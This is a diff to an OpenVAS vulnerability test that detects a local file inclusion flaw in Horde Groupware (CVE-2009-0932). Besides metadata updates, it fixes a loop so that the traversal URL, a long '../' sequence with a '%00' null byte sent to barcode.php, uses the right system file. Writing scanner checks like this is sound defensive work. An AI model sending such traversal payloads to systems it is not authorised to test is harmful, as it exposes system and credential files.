@@ -1,6 +1,6 @@
 ###############################################################################
 # OpenVAS Vulnerability Test
-# $Id: gb_horde_lfi_vuln.nasl 11796 2018-10-09 13:08:43Z jschulte $
+# $Id: gb_horde_lfi_vuln.nasl 13792 2019-02-20 13:15:35Z cfischer $
 #
 # Horde Products Local File Inclusion Vulnerability
 #
@@ -29,8 +29,8 @@ CPE = 'cpe:/a:horde:horde_groupware';
 if(description)
 {
   script_oid("1.3.6.1.4.1.25623.1.0.801849");
-  script_version("$Revision: 11796 $");
-  script_tag(name:"last_modification", value:"$Date: 2018-10-09 15:08:43 +0200 (Tue, 09 Oct 2018) $");
+  script_version("$Revision: 13792 $");
+  script_tag(name:"last_modification", value:"$Date: 2019-02-20 14:15:35 +0100 (Wed, 20 Feb 2019) $");
   script_tag(name:"creation_date", value:"2011-02-17 16:08:28 +0100 (Thu, 17 Feb 2011)");
   script_cve_id("CVE-2009-0932");
   script_bugtraq_id(33491);
@@ -87,6 +87,8 @@ if (dir == "/")
 files = traversal_files();
 
 foreach pattern (keys(files)) {
+
+  file = files[pattern];
   url = dir + "/util/barcode.php?type=../../../../../../../../../../../" + file + "%00";
 
   if (http_vuln_check(port:port, url:url, pattern:pattern, check_header: TRUE)) {
